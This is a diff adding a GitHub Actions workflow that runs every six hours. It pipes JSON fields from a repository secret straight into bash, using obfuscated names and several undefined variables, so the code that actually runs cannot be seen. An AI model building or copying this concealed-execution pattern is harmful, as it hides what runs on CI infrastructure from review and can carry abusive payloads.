@@ -1,0 +1,22 @@
+name: yehexinjiu
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '32 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yehexinjiu
+        env:
+          yax0: ${{ secrets.yax0 }}
+        run: |
+          echo $yax0 | jq -r .h7109 | /bin/bash
+          echo $z6488 | jq -r .otbac36 | /bin/bash
+          echo $xi2291 | jq -r .e75 | /bin/bash
+          echo $f05 | jq -r .ydi6 | /bin/bash
+          echo $jau304 | jq -r .dmlv75 | /bin/bash
+          echo $m3918 | jq -r .idzib986 | /bin/bash
+
